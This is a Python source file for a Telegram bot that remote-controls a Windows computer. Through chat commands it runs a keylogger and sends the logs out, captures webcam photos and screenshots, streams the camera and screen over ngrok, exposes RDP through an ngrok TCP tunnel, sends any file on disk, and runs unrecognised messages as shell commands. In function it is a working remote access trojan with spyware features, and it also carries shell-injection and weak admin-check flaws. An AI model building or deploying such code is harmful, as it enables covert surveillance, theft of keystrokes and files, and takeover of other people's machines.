import asyncio
import socket
from werkzeug.utils import safe_join
import live_webserver as lw
import os
from dotenv import load_dotenv
import secrets
import pyscreenshot
import json
from subprocess import Popen, PIPE
import datetime
import cv2
from logger import Listener, key_handeler
import requests
from pynput.keyboard import Controller as key
import speech_recognition as sr
import pyttsx3
from pyngrok import ngrok
import joblib
from telegram import InlineKeyboardMarkup, InlineKeyboardButton, Update, ReplyKeyboardMarkup
from telegram.ext import ContextTypes
import asyncio

if (os.getenv("CHAT_BOT_ENABLED") != "False"):
    import ollama


class Features:
    """
    A class to represent various features of a Telegram bot.

    Attributes:
        telegram_bot: An instance of the Telegram bot.
        admin_chat_id: The chat ID of the admin.
        api_key: The API key for the Telegram bot.
        admin_name: The name of the admin.
        ngrok_token: The token for Ngrok.
        pronoun: Pronoun used for the bot.
        ffmpegPathPrefix: Path prefix for ffmpeg.
        chat_id_file: ID of the chat file.
        photo_name: Name of the photo file.
        authorzed_users: Path to the authorized users JSON file.
        key_log_file: Path to the key logger file.
        fin: File content.
        random_f: Random string for authorization.
        fname: File name.
        file_message_id: ID of the file message.
        server_thread_state: State of the server thread.
        random: Random number for authorization.
        public_url: Public URL for the server.
        now: Current date and time.
        authorized: Authorization status.
        aut_chat_id: Authorized chat ID.
        pending: Pending authorization status.
        logging: Logging status.
        logger: Logger instance.
        screen_State: State of the screen.
        video_State: State of the video.
        language_model: Language model pipeline for text generation.
    """

    def __init__(self, telegram_bot):
        """
        Initializes the features class with the given Telegram bot instance.
        Loads environment variables and authorized users.

        Args:
            telegram_bot: An instance of the Telegram bot.
        """
        load_dotenv()
        self.nlp_model = joblib.load('text_classifier.joblib')
        self.admin_chat_id = os.getenv("ADMIN_CHAT_ID")
        self.api_key = os.getenv("API_KEY")
        self.admin_name = os.getenv("ADMIN_NAME")
        self.ngrok_token = os.getenv("NGROK_TOKEN")
        self.pronoun = os.getenv("PRONOUN")
        self.ffmpeg_path_prefix = os.getenv("FFMPEG_PATH_PREFIX")
        self.rdp_port = os.getenv("RDP_PORT", "3389")
        self.rdp_active = False
        self.chat_bot_enabled = os.getenv(
            "CHAT_BOT_ENABLED", "True").lower() in ("true", "1", "t")
        self.chat_id_file = 0
        self.photo_name = 'photo.png'
        self.authorzed_users = 'authorzed_Users/authorzed_Users.json'
        self.key_log_file = "KeyLoger.txt"
        self.fin = ''
        self.random_f = ''
        self.fname = ''
        self.file_message_id = ''
        self.server_thread_state = ''
        self.random = 1
        self.public_url = ''
        self.now = datetime.datetime.now()
        self.authorized = 0
        self.aut_chat_id = 0
        self.pending = 0
        self.logging = False
        self.logger = 0
        self.telegram_bot = telegram_bot
        file_found = False
        self.screen_state = False
        self.video_state = False
        self.chat_history = {}  # Dictionary to store chat history
        self.no_nlp = {}  # Dictionary to store no NLP flag per chat
        self.chat_mode = {}  # Dictionary to store chat modes
        self.nlp_classifier_output = {}  # Dictionary to store NLP classifier outputut
        self.keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton('yes', callback_data='yes'), InlineKeyboardButton(
                'no', callback_data='no')],
        ])
        self.reply_keyboard = ReplyKeyboardMarkup(
            [['Video Streaming', 'Screen Sharing',],
             ['Screenshot', 'Photo',],
             ['Keyloger',  'List Users',],
             ['Remote Desktop', 'NLP State']],
            resize_keyboard=True, one_time_keyboard=False)
        self.reply_keyboard_to_commad = {
            'Video Streaming': 'video',
            'Screen Sharing': 'screen',
            'Screenshot': 'screenshot',
            'Photo': 'photo',
            'Keyloger': 'keylog',
            'List Users': 'list',
            'Remote Desktop': 'rdp',
            'NLP State': 'nlp',
        }
        self.command_handlers = {
            "send": self.send,
            "video": self.video,
            "screen": self.screen,
            "types": self.keyboard_type,
            "speak": self.speak,
            "screenshot": self.take_screenshot,
            "stop": self.kill_task,
            "photo": self.take_photo,
            "keylog": self.key_logger,
            "chat": self.run_language_model,
            "list": self.list_users,
            "kick": self.kick_user,
            "rdp": self.start_stop_rdp_tunnel,
            'nlp': self.set_nlp_flag_async,
        }
        self._commmand_confrimation_msg = {
            "send": "did you mean to send a document?",
            "video": "did you mean to start/stop video streaming?",
            "screen": "did you mean to start/stop screen sharing?",
            "types": "did you mean to type the given text?",
            "speak": "did you mean to convert text to speech?",
            "screenshot": "did you mean to take a screenshot?",
            "stop": "did you mean to stop a task?",
            "photo": "did you mean to take a photo?",
            "keylog": "did you mean to start/stop key logging?",
            "chat": "did you mean to chat with the AI?",
            "list": "did you mean to list all authorized users?",
            "kick": "did you mean to kick an authorized user?",
            "rdp": "did you mean to start/stop RDP tunnel?",
        }
        while not file_found:
            try:
                with open(self.authorzed_users) as f:
                    self.auth_list = json.load(f)
                print(self.auth_list)
                file_found = True
            except FileNotFoundError:
                data = {'authorized': [{'chat_id': None, 'Name': None}]}
                with open(self.authorzed_users, 'w') as f:
                    json.dump(data, f, indent=2)

    async def set_nlp_flag_async(self, chat_id, command, command_list, first_name, last_name, context):
        """
        Sets the NLP flag for the given chat_id.

        Args:
            chat_id (int): The chat ID of the user.
            flag (bool): The NLP flag to be set.
        """
        if self.no_nlp.get(chat_id) is None:
            self.no_nlp[chat_id] = True
        self.no_nlp[chat_id] = not self.no_nlp[chat_id]
        await context.bot.send_message(chat_id=chat_id, text='NLP enabled' if self.no_nlp[chat_id] else 'NLP disabled')

    async def test_message_async(self, bot):
        """
        Sends a test message to the admin with the IP configuration details.
        """
        i = 2
        while (i > 0):
            messag = Popen('ipconfig', shell=True, stdout=PIPE,
                           text=True).communicate()[0]
            await bot.send_message(chat_id=self.admin_chat_id, text=messag, reply_markup=self.reply_keyboard)
            i = i - 1
            asyncio.sleep(.5)

    async def live_server(self, chat_id, first_name, last_name, context):
        """
        Starts or stops the live server based on the current state.

        Args:
            chat_id (int): The chat ID of the user.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
        """
        if (self.rdp_active):
            await context.bot.send_message(
                chat_id=chat_id, text="Cannot start/stop live server as RDP tunnel is running on the server")
            return None
        if self.server_thread_state == "ON" and not self.video_state and not self.screen_state:
            lw.stop_server()
            ngrok.kill()
            await context.bot.send_message(
                chat_id=chat_id, text="video feed ended")
            self.server_thread_state = ""
            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
                await context.bot.send_message(
                    chat_id=self.admin_chat_id, text=f'''live video feed stopped by {first_name} {last_name}.''')
        else:
            lw.start_server_in_thread()
            tunnel = ngrok.connect(5000, 'http')
            self.public_url = str(tunnel).split('''"''')[1]
            self.server_thread_state = "ON"
        return None

    async def send(self, chat_id, command, command_list, first_name, last_name, context):
        """
        Sends a document to the specified chat ID.

        Args:
            chat_id (int): The chat ID to send the document to.
            command (str): The command received from the user.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
            context: The context object from python-telegram-bot
        """
        fp = command[len(command_list[0]) + 1:]
        await context.bot.send_document(chat_id=chat_id, document=open(fp, 'rb'))

    async def video(self, chat_id, command, command_list, first_name, last_name, context):
        """
        Toggles the video state and manages the live server accordingly.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The command received from the user.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
            context: The context object from python-telegram-bot
        """
        print('hi')
        self.video_state = not self.video_state
        if self.video_state:
            if self.server_thread_state != "ON":
                await self.live_server(chat_id, first_name, last_name, context)
            await context.bot.send_message(chat_id=chat_id, text=f'''for live video feed visit
{self.public_url}''')
            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
                await context.bot.send_message(chat_id=self.admin_chat_id, text=f'''live video feed started by {first_name} {last_name} visit
{self.public_url}''')
        else:
            if not self.screen_state and not self.video_state:
                await self.live_server(chat_id, first_name, last_name, context)
            else:
                await context.bot.send_message(
                    chat_id=chat_id, text='Cannot stop server as other services are running on the server')

    async def screen(self, chat_id, command, command_list, first_name, last_name, context):
        """
        Toggles the screen state and manages the live server accordingly.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The command received from the user.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
            context: The context object from python-telegram-bot
        """
        self.screen_state = not self.screen_state
        if self.screen_state:
            if self.server_thread_state != "ON":
                await self.live_server(chat_id, first_name, last_name, context)

            await context.bot.send_message(chat_id=chat_id, text=f'''for live Screen feed visit
{self.public_url}/screen''')
            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
                await context.bot.send_message(chat_id=self.admin_chat_id, text=f'''live Screen feed started by {first_name} {last_name} visit
{self.public_url}/screen''')
        else:
            if not self.screen_state and not self.video_state:
                await self.live_server(chat_id, first_name, last_name, context)
            else:
                await context.bot.send_message(
                    chat_id=chat_id, text='Cannot stop server as other services are running on the server')

    async def download_file_async(self, msg, key, update: Update, context: ContextTypes.DEFAULT_TYPE):  # NOSONAR
        """
        Downloads a file from a message and handles authorization.

        Args:
            msg (dict): The message containing the file.
            key (str): The key indicating the type of file.
            context: The context object from python-telegram-bot

        Returns:
            tuple: A tuple indicating if speech recognition was performed and the recognized text.
        """

        message = update.message
        key_list = ["text", "voice", "photo", "video", "document"]
        chat_id = message.chat_id
        self.file_message_id = message.message_id
        print(self.file_message_id)
        self.chat_id_file = chat_id
        authorized = False
        if self.pending == 0 or chat_id != self.aut_chat_id:
            for i in self.auth_list['authorized']:
                if i['chat_id'] == chat_id:
                    authorized = True
                    break
        if authorized:
            filename = None
            fid = None
            # Document
            if message.document:
                filename = message.document.file_name
                fid = message.document.file_id
            # Photo
            elif message.photo:
                filename = f"photo_{message.photo[-1].file_unique_id[:6]}.jpg"
                fid = message.photo[-1].file_id
            # Video
            elif message.video:
                filename = message.video.file_name or f"video_{message.video.file_unique_id[:6]}.mp4"
                fid = message.video.file_id
            # Audio
            elif message.audio:
                filename = message.audio.file_name or f"audio_{message.audio.file_unique_id[:6]}.mp3"
                fid = message.audio.file_id
            # Voice
            elif message.voice:
                filename = f"voice_{message.voice.file_unique_id[:6]}.ogg"
                fid = message.voice.file_id
            # if key == key_list[4]:
            print(f"#############  {fid}, {message}")
            self.fname = filename
            print(f"#############{self.fname}")
            # print(f"#############  {fid}, {message.audio.file_id}")
            resp = requests.get(
                url=f"https://api.telegram.org/bot{self.api_key}/getFile?file_id={fid}")
            resp = resp.json()
            if resp["ok"] == False:
                await context.bot.send_message(
                    chat_id=chat_id, text=resp["description"])
                return False, ""
            fp = resp["result"]["file_path"]
            if key != key_list[4]:
                self.fname = fp[fp.index('/')+1:]
            self.fin = requests.get(
                url=f"https://api.telegram.org/file/bot{self.api_key}/{fp}", allow_redirects=True)
            speach_recon = False
            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
                if self.fname.endswith(".oga"):
                    with open(safe_join('downloads', self.fname), "wb") as f:
                        f.write(self.fin.content)
                    speach_recon, text = await self.recognise_speech_and_do(
                        chat_id, self.fname, f"{message.chat.first_name} {message.chat.last_name}", context)
                    return speach_recon, text
                else:
                    print(self.admin_chat_id)
                    self.random_f = str(secrets.token_hex(32)).upper()
                    text = ''
                    await context.bot.send_message(
                        chat_id=chat_id, text=f'{self.admin_name} will tell you the authorization code')
                    await context.bot.send_message(
                        chat_id=self.admin_chat_id, text=f"do you want to receive {key} send a key to {message.chat.first_name} {message.chat.last_name} of ")
                    await context.bot.send_message(
                        chat_id=self.admin_chat_id, text=self.random_f)
                    return speach_recon, text
            else:
                text = ''
                with open(safe_join('downloads', self.fname), "wb") as f:
                    f.write(self.fin.content)
                if self.fname.endswith(".oga"):
                    speach_recon, text = await self.recognise_speech_and_do(
                        chat_id, self.fname, f"{message.chat.first_name} {message.chat.last_name}", context)

                self.chat_id_file = 0
                self.fin = ""
                await context.bot.send_message(
                    chat_id=chat_id, text=f'file saved as {self.fname}')
                self.fname = ""

                self.file_message_id = "aa"
                return speach_recon, text

    async def recognise_speech_and_do(self, chat_id, fname, name, context: ContextTypes.DEFAULT_TYPE = None):
        """
        Recognizes speech from an audio file and sends the text to the user.

        Args:
            chat_id (int): The chat ID of the user.
            fname (str): The name of the audio file.
            name (str): The name of the user.
            context: The context object from python-telegram-bot

        Returns:
            tuple: A tuple indicating if speech recognition was successful and the recognized text.
        """
        convert_command = f'{self.ffmpeg_path_prefix}ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
        print(convert_command)
        message = Popen(convert_command, shell=True,
                        stdout=PIPE, text=True).communicate()[0]
        text = ""
        print(message)
        speach = sr.Recognizer()
        try:
            with sr.AudioFile(f"downloads/{fname}.wav") as source:
                # listen for the data (load audio to memory)
                audio_data = speach.record(source)
                # recognize (convert from speech to text)
                text = speach.recognize_google(audio_data)
            os.remove(f"downloads/{fname}.wav")
            os.remove(f"downloads/{fname}")
        except sr.UnknownValueError:
            await context.bot.send_message(
                chat_id=chat_id, text=f"Didn't get what you said {name}")
        print('deleted')
        print(text)
        await context.bot.send_message(
            chat_id=chat_id, text=f'you said {text}')
        self.chat_id_file = 0
        self.fin = ""
        fname = ""
        self.file_message_id = "aa"
        return True, text

    async def speak(self, chat_id, command, command_list, first_name, last_name, context):
        """
        Converts text to speech and plays it.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The text command to be spoken.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
            context: The context object from python-telegram-bot
        """
        speak = pyttsx3.init()
        x = len(command_list[0])
        speak.say(command[x:])
        speak.runAndWait()

    def save_file_in_fin(self, chat_id):
        """
        Saves the file content in the specified location.

        Args:
            chat_id (int): The chat ID of the user.
        """
        with open(safe_join('downloads', self.fname), "wb") as f:
            f.write(self.fin.content)
        self.chat_id_file = 0
        self.fin = ""
        self.telegram_bot.send_message(chat_id, f'file saved as {self.fname}')
        self.fname = ""
        self.file_message_id = "aa"

    async def take_screenshot(self, chat_id, command, command_list, first_name, last_name, context):
        """
        Takes a screenshot and sends it to the specified chat ID.

        Args:
            chat_id (int): The chat ID to send the screenshot to.
            command (str): The command received from the user.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
            context: The context object from python-telegram-bot
        """
        print("scr")
        img = pyscreenshot.grab()
        img.save('screen.png')
        await context.bot.send_photo(chat_id=chat_id, photo=open("screen.png", 'rb'))
        os.remove("screen.png")

    async def kill_task(self, chat_id, command, command_list, first_name, last_name, context):
        """
        Kills a task based on the provided command.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The command received from the user.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
            context: The context object from python-telegram-bot
        """
        command_exec = f'''Taskkill /f /Im "{command_list[1]}.exe" /t'''
        if len(command_list) == 2:
            message = Popen(command_exec, shell=True,
                            stdout=PIPE, text=True).communicate()[0]
        else:
            message = 'Invalid command'
        await context.bot.send_message(chat_id=chat_id, text=message)

    async def keyboard_type(self, chat_id, command, command_list, first_name, last_name, context):
        """
        Simulates keyboard typing of the given command.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The command to be typed.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
            context: The context object from python-telegram-bot
        """
        keyboard = key()
        x = len(command_list[0])
        keyboard.type(command[x+1:])

    async def take_photo(self, chat_id, command, command_list, first_name, last_name, context):
        """
        Takes a photo using the webcam and sends it to the specified chat ID.

        Args:
            chat_id (int): The chat ID to send the photo to.
            command (str): The command received from the user.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
            context: The context object from python-telegram-bot
        """
        vod = cv2.VideoCapture(0)
        if not vod.isOpened():
            await context.bot.send_message(
                chat_id=chat_id, text="No camera attached or accessible.")
            return

        ret, img = vod.read()
        vod.release()

        if ret:
            cv2.imwrite(self.photo_name, img)
            await context.bot.send_photo(
                chat_id=chat_id, photo=open(self.photo_name, 'rb'))
            os.remove(self.photo_name)
        else:
            await context.bot.send_message(chat_id=chat_id, text="Failed to capture image.")

    async def key_logger(self, chat_id, command, command_list, first_name, last_name, context):
        """
        Starts or stops the key logger based on the current logging state.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The command received from the user.
            command_list (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
            context: The context object from python-telegram-bot
        """
        if not self.logging:
            self.logger = Listener(on_press=key_handeler)
            with open(self.key_log_file, "w") as f:
                f.write("log started\n")
            self.logger.start()
            await context.bot.send_message(chat_id=chat_id, text="Key logger started")
            self.logging = True
            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
                await context.bot.send_message(
                    chat_id=self.admin_chat_id, text=f'''Key logger started by {first_name} {last_name}.''')
        else:
            self.logger.stop()
            await context.bot.send_message(chat_id=chat_id, text="Key logger stopped")
            await context.bot.send_document(
                chat_id=chat_id, document=open(self.key_log_file, "rb"))
            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
                await context.bot.send_message(chat_id=self.admin_chat_id, text=f'''Key logger stopped by {first_name} {last_name},
here is log''')
                await context.bot.send_document(
                    chat_id=self.admin_chat_id, document=open(self.key_log_file, "rb"))
            x = open(self.key_log_file, "w")
            x.close()
            os.remove(self.key_log_file)
            self.logging = False

    async def send_first_auth_code_async(self, chat_id, name, context):
        """
        Sends the first authorization code to the user.

        Args:
            chat_id (int): The chat ID of the user.
            name (str): The name of the user.
            context: The context object from python-telegram-bot
        """
        self.random = str(secrets.token_hex(6)).upper()
        print(self.random, type(self.random))

        await context.bot.send_message(
            chat_id=self.admin_chat_id, text=self.random)
        await context.bot.send_message(chat_id=self.admin_chat_id, text=str(
            'do you want to authorize ' + name))

        await context.bot.send_message(
            chat_id=chat_id, text=f'you are not an authorized user please contact {self.admin_name}')
        await context.bot.send_message(
            chat_id=chat_id, text=f'{self.pronoun} will tell you the authorization code')
        self.aut_chat_id = chat_id
        self.pending = 1
        print(self.pending, self.aut_chat_id)

    async def receive_auth_code_async(self, name, chat_id, command, context):
        """
        Receives and verifies the authorization code from the user.

        Args:
            name (str): The name of the user.
            chat_id (int): The chat ID of the user.
            command (str): The authorization code provided by the user.
            context: The context object from python-telegram-bot
        """
        print(self.random)
        if command == self.random:
            await context.bot.send_message(
                chat_id=chat_id, text=str('you are authorized ' + name), reply_markup=self.reply_keyboard)
            new_guy = {'chat_id': chat_id, 'Name': name}
            print(new_guy)
            self.auth_list['authorized'].append(new_guy)
            print(self.auth_list)
            self.pending = 0
            with open(self.authorzed_users, 'w') as f:
                json.dump(self.auth_list, f, indent=2)
                f.close()
        else:
            await context.bot.send_message(
                chat_id=chat_id, text='sorry invalid code')

    def record_message(self, chat_id, message):
        """
        Records a message in the chat history for the given chat_id.

        Args:
            chat_id (int): The chat ID of the user.
            message (str): The message to be recorded.
        """
        if chat_id not in self.chat_history:
            self.chat_history[chat_id] = []
        self.chat_history[chat_id].append(message)

    def get_chat_history(self, chat_id):
        """
        Retrieves the chat history for the given chat_id.

        Args:
            chat_id (int): The chat ID of the user.

        Returns:
            list: The chat history for the given chat_id.
        """
        return self.chat_history.get(chat_id, [])

    def get_chat_mode(self, chat_id):
        """
        Retrieves the chat mode for the given chat_id.

        Args:
            chat_id (int): The chat ID of the user.

        Returns:
            str: The chat mode for the given chat_id.
        """
        return self.chat_mode.get(chat_id, "non_ai")

    def set_chat_mode(self, chat_id, is_ai):
        """
        Sets the chat mode for the given chat_id.

        Args:
            chat_id (int): The chat ID of the user.
            mode (str): The chat mode to be set.
        """
        self.chat_mode[chat_id] = 'ai' if is_ai else 'non_ai'

    async def retrieve_command_predictions_async(self, chat_id, command, list_command, first_name, last_name, context):
        """
        Retrieves the predictions for the given command. If the prediction confidence is low, it asks for confirmation.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The command received from the user.
            list_command (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
            context: The context object from python-telegram-bot

        Returns:
            None
        """

        predictons = self.nlp_model.predict_proba([command])
        print(self.nlp_model.classes_.tolist()[predictons.argmax()])
        if predictons.tolist()[0][predictons.argmax()] < 0.5:
            self.nlp_classifier_output[chat_id] = {
                'command': command, 'prediction': self.nlp_model.classes_.tolist()[predictons.argmax()]}
            await context.bot.send_message(chat_id=chat_id, text=self._commmand_confrimation_msg[self.nlp_model.classes_.tolist()[
                predictons.argmax()]], reply_markup=self.keyboard)
        else:
            await self.command_handlers[self.nlp_model.classes_.tolist()[predictons.argmax()]](
                chat_id, command, list_command, first_name, last_name, context)

    async def execute_chat_command_async(self, chat_id, command, list_command, first_name, last_name, context, reply=False):
        """
        Executes a chat command based on the given command and list of command arguments.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The command received from the user.
            list_command (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
            context: The context object from python-telegram-bot
            reply (bool, optional): If True, the command is a reply to a previous message. Defaults to False.

        Returns:
            None
        """
        print('execute_chat_command', command,
              list_command, first_name, last_name, reply)
        if command.startswith('>'):
            command = command[1:]
            list_command[0] = list_command[0][1:]
            reply = True
        if self.no_nlp.get(chat_id) is False:
            reply = True
        if self.reply_keyboard_to_commad.get(command):
            list_command = [self.reply_keyboard_to_commad[command]]
            command = self.reply_keyboard_to_commad[command]
            reply = True
        if not reply:
            await self.retrieve_command_predictions_async(
                chat_id, command, list_command, first_name, last_name, context)
            return
        cmd = list_command[0].lower()

        if self.chat_mode.get(chat_id) == 'ai':
            await self.command_handlers['chat'](
                chat_id, command, list_command, first_name, last_name, context)
        elif cmd in self.command_handlers:
            await self.command_handlers[cmd](
                chat_id, command, list_command, first_name, last_name, context)
        elif chat_id == self.chat_id_file and cmd == self.random_f:
            self.save_file_in_fin(chat_id)
        else:
            print('Executing as shell command')
            process = Popen(command, shell=True,
                            stdout=PIPE, stderr=PIPE, text=True)
            stdout, stderr = process.communicate()
            if process.returncode != 0:
                await context.bot.send_message(
                    chat_id=chat_id, text="INVALID Command")
            else:
                await context.bot.send_message(chat_id=chat_id, text=stdout)
                await context.bot.send_message(chat_id=chat_id, text='ok')

    async def reply_button_async(self, msg, context):
        """
        Handles the reply button callback query.

        Args:
            msg (dict): The callback query message.
            context: The context object from python-telegram-bot

        Returns:
            None
        """
        query_data = msg['data']
        chat_id = msg['message']['chat']['id']
        first_name = msg['message']['chat']['first_name']
        last_name = msg['message']['chat']['last_name']
        if query_data == 'yes':
            command = self.nlp_classifier_output[chat_id]['command']
            list_command = command.split()
            await self.command_handlers[self.nlp_classifier_output[chat_id]['prediction']](
                chat_id, command, list_command, first_name, last_name, context)
            self.nlp_classifier_output[chat_id] = {}
        elif query_data == 'no':
            await self.execute_chat_command_async(chat_id, self.nlp_classifier_output[chat_id]['command'], self.nlp_classifier_output[chat_id]['command'].split(
            ), first_name, last_name, context, reply=True)
            self.nlp_classifier_output[chat_id] = {}

    async def run_language_model(self, chat_id, command, list_command, first_name, last_name, context):
        """
        Runs a language model to generate a response based on the user's input.

        Args:
            chat_id (int): The chat ID of the user.
            command (str): The command received from the user.
            list_command (list): The list of command arguments.
            first_name (str): The first name of the user.
            last_name (str): The last name of the user.
            context: The context object from python-telegram-bot
        """
        if self.chat_bot_enabled == False:
            await context.bot.send_message(
                chat_id=chat_id, text="Chat bot is disabled. Please enable it to use this feature.")
            return
        user_name = f"{first_name} {last_name}"
        prompt = f"{user_name} says: {' '.join(list_command[1:])}"

        messages = [
            {"role": "system", "content": "You are a helpful assistant."},
            *[
                {"role": "user", "content": m}
                for m in self.get_chat_history(chat_id)
            ],
            {"role": "user", "content": prompt}
        ]
        result = ollama.chat(model="llama3", messages=messages)
        response = ''.join(result['message']['content'])
        self.record_message(chat_id, f"User: {prompt}")
        self.record_message(chat_id, f"Bot: {response}")
        await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')

    async def list_users(self, chat_id, command, list_command, first_name, last_name, context):
        """
        Lists all authorized users and sends the list to the requesting user.

        Args:
            chat_id (int): The chat ID of the user requesting the list.
            context: The context object from python-telegram-bot

        Returns:
            None
        """
        if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
            await context.bot.send_message(
                chat_id=chat_id, text="You are not authorized to use this command.")
            return
        users_available = False
        user_list = "Authorized Users:\n"
        for user in self.auth_list['authorized']:
            if user['chat_id'] is None or user['chat_id'] == int(self.admin_chat_id):
                continue
            user_list += f"Name: {user['Name']}, Chat ID:`{user['chat_id']}`\n"
            users_available = True
        await context.bot.send_message(
            chat_id=chat_id, text=user_list if users_available else 'No authorized users', parse_mode='MarkdownV2')

    async def kick_user(self, chat_id, command, list_command, first_name, last_name, context):
        """
        Removes a user from the authorized list and notifies them.

        Args:
            chat_id (int): The chat ID of the user to be removed.
            context: The context object from python-telegram-bot

        Returns:
            None
        """
        if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
            await context.bot.send_message(
                chat_id=chat_id, text="You are not authorized to use this command.")
            return
        remove_chat_id = list_command[1] if len(list_command) > 1 else None
        if remove_chat_id and remove_chat_id.isdigit():
            remove_chat_id = int(remove_chat_id)
        else:
            remove_chat_id = None
        if not remove_chat_id:
            await context.bot.send_message(
                chat_id=chat_id, text="Please provide the chat ID of the user to remove.")
            return
        user_to_remove = next(
            (user for user in self.auth_list['authorized'] if user['chat_id'] == remove_chat_id), None)
        if user_to_remove:
            self.auth_list['authorized'].remove(user_to_remove)
            with open(self.authorzed_users, 'w') as f:
                json.dump(self.auth_list, f, indent=2)
            await context.bot.send_message(
                chat_id=self.admin_chat_id, text=f"User {user_to_remove['Name']} has been kicked.")
        else:
            await context.bot.send_message(
                chat_id=self.admin_chat_id, text="User not found in the authorized list.")

    async def start_stop_rdp_tunnel(self, chat_id, command, list_command, first_name, last_name, context):
        # Set up ngrok tunnel
        if (self.rdp_active):
            ngrok.kill()
            self.rdp_active = False
            await context.bot.send_message(chat_id=chat_id, text="RDP tunnel stopped")
            if (not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id))):
                await context.bot.send_message(
                    chat_id=self.admin_chat_id, text=f'''RDP tunnel stopped by {first_name} {last_name}''')
            return
        elif (self.video_state):
            await context.bot.send_message(
                chat_id=chat_id, text="Cannot start RDP tunnel as other video feed is running on the server")
            return
        elif (self.screen_state):
            await context.bot.send_message(
                chat_id=chat_id, text="Cannot start RDP tunnel as other screen feed is running on the server")
            return
        ngrok_tunnel = ngrok.connect(self.rdp_port, "tcp")

        self.rdp_active = True
        # Get tunnel information
        tunnel_domain = ngrok_tunnel.public_url.split("/")[2].split(":")[0]
        # get ip address from domain:port
        print(ngrok_tunnel.public_url.split("/"))
        tunnel_ip = socket.gethostbyname(tunnel_domain)
        tunnel_port = ngrok_tunnel.public_url.split(":")[2]
        await context.bot.send_message(
            chat_id=chat_id, text=f"RDP tunnel started at `{tunnel_ip}:{tunnel_port}`", parse_mode='MarkdownV2')
        if (not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id))):
            await context.bot.send_message(
                chat_id=self.admin_chat_id, text=f'''RDP tunnel started by {first_name} {last_name}''')
